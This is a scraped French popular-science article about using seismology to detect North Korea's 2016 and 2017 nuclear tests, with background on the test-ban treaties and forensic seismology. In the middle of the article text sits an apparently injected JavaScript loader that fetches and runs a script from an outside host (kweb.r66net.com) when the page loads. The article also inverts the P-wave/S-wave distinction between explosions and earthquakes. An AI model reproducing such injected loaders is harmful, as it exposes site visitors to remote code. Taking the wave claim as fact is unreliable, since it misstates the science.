{"title": "Sismologie : detecter un essai de bombe H en Coree du Nord, c'est simple", "newspaper": "Futura Sciences", "author": ["Jean-Luc Goudet"], "date_publi": "2016-01-06", "content": "La Coree du Nord vient de proceder, le 3 septembre 2017, a un sixieme essai souterrain d'une arme puissante, presentee comme une bombe << H >>, thermonucleaire, donc. Toujours selon les sources officielles, elle representerait 160 kilotonnes de TNT, et l'explosion a provoque un seisme de 6,3. Cette puissance serait 9,8 fois plus forte que celle du precedent test, en janvier 2016, quand les sismographes du monde entier avaient mesure une magnitude 5,1, comme l'expliquait Futura. Article publie le 6 janvier 2016 Le 6 janvier 2016, a 1 h 30 TU (2 h 30 en France metropolitaine), les sismographes de multiples pays enregistrent un  seisme  de  magnitude  5,1. Grace a la mise en reseau de ces detecteurs, a differentes echelles (regionales, nationales et internationales), l'evenement est parfaitement localise : la profondeur est tres faible et l' epicentre  se trouve en Coree du Nord, au nord-est du pays, pres du village de Punggye-ri, le site d'un centre d'experiences nucleaires, ou ont deja eu lieu des  essais nucleaires  souterrains en 2009 et en 2013. Le gouvernement nord-coreen explique l'explosion par l'essai d'une  bombe H , ou bombe a  hydrogene . L'acuite de l'activite de surveillance de l'activite sismique de notre planete permet donc de reperer aussi les explosions, nucleaires ou autres - le 19 avril 1995, a Oklahoma City (Etats-Unis), des sismographes avaient ainsi detecte les  vibrations  generees par la bombe ayant ravage l'immeuble Murrah. Pourtant, historiquement, la relation est plutot inverse : c'est la competition entre les armements nucleaires entre les Etats-Unis et l'Union sovietique qui, des les annees 1960, a conduit les premiers a se doter d'enormes reseaux de sismographes, 500 par exemple pour celui deploye a cette epoque dans le Montana. L'explosion souterraine en Coree du Nord a ete enregistree, comme tout seisme, par les reseaux de sismographes mondiaux. Ici, le signalement realise par le Centre de sismologie euro-mediteraneen sur son site Web. (c) CSEM                               Le traite CTBT interdit les essais a ceux qui l'ont signe Ces essais font l'objet de negociations depuis 1963, apres la grave crise des  missiles  de Cuba. Le traite d'interdiction des essais nucleaires a ete signe cette annee-la par les Etats-Unis, l'URSS et le Royaume-Uni. La France ne s'y est ralliee qu'en 1980.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Les tests dans l'espace (voire sur la  Lune ...) faisaient partie du traite mais les essais souterrains en restaient exclus et ont donc ete poursuivis. Ils ont ete bannis en 1996 dans le Traite d'interdiction complete des essais nucleaires, ou CTBT,  Comprehensive-Test-Ban Treaty  mais trois pays dotes de l' arme nucleaire  ne l'ont pas signe : la Coree du Nord, l'Inde et le Pakistan. Depuis 1945, plus de 2.000 essais de bombes nucleaires, a fission ou a hydrogene, ont ete effectues dans le monde. (c) Ide                               La sismologie legale pour reperer une explosion d'origine humaine Depuis tout ce temps, les sismologues ont appris a faire la difference entre une explosion et un tremblement de  terre . Cette veritable discipline a pris le nom de  sismologie  legale, a l'image de la  medecine legale . Plusieurs criteres sont retenus pour reperer une explosion parmi les milliers de seismes qui se produisent en permanence : La profondeur : elle est toujours faible pour les essais et comptee en dizaines de kilometres pour les  seismes . Encore faut-il la determiner suffisamment precisement. Le rapport ondes P/ondes S : un seisme genere deux types d'ondes au sein du sol, appelees P et S, pour primaire et secondaire. Les premieres sont des ondes de  compression , analogues au son. Les ondes S, ou de cisaillement, se manifestent par un  mouvement  du sol perpendiculaire a la propagation. Il a ete observe, de maniere tres nette, que les explosions generent surtout des ondes S alors que les seismes produisent davantage d'ondes P. Le rapport Mb/Ms : les mesures des deplacements au passage des  ondes sismiques  permettent d'estimer l'ampleur d'un  seisme , ou magnitude, dont il existe plusieurs approches. Mb est la magnitude de  volume  (avec b pour  body , corps en anglais) et depend du mouvement vertical du aux ondes P. Ms, la magnitude de surface, se calcule avec les mouvements induits par les ondes de Rayleigh, un autre type d'ondes sismiques. Le rapport Mb/Ms est generalement plus faible pour une explosion. Modelisation  : des modeles tenant compte de differents parametres, dont la distance ou l'environnement geologique, peuvent aider a mieux cerner la nature du phenomene originel. (Ces informations viennent en partie d'un document en anglais,  Forensic Seismology and the Comprehensive-Nuclear-Test-Ban Treaty .) Les sismogrammes correspondant a un test nucleaire souterrain (en rouge, essai indien du 11 mai 1998) et a un seisme (en bleu) presentent des aspects tres differents. (c) J. David Rogers, universite du Missouri, Keith D. Koper, universite St. Louis                               Bombe H ou pas ? Avec ce genre d'elements, le  CTBTO  ( CTBT Organization ) estime la puissance de l'explosion dans la meme fourchette que celle de l'essai nord-coreen de 2013, qui avait produit un evenement sismique d'une magnitude de 4,5. Selon  The Guardian , cette valeur indiquerait pour la bombe une puissance de 6 a 9 kilotonnes. D'autres estimations proposent une valeur plus elevee pour l'explosion de 2013. Toutes restent neanmoins inferieures aux puissances des bombes qui ont detruit  Hiroshima  et Nagasaki, et qui n'etaient pas des bombes H mais des engins a  fission , en principe bien moins puissants. Il est donc possible qu'il ne s'agisse pas d'une bombe H mais seulement d'une bombe atomique a fission, ou encore d'un explosif conventionnel. Il peut s'agir aussi d'un petit modele, propre a etre installe dans un missile de faible taille.  Vous avez aime cet article ? N'hesitez pas a le partager avec vos ami(e)s et aidez-nous a faire connaitre Futura :) ! La Redaction vous remercie. Facebook Twitter Google+ Linkedin Pinterest A voir aussi :  coree du nord  |  la sismologie  |  robot coree  |  guerre de coree resume  |  ecureuil de coree forum  |  essai de cisaillement  |  essai de traction  |  essai sigma 18-200  |  essai clinique  |  essai de charpy", "theme": "sciences"}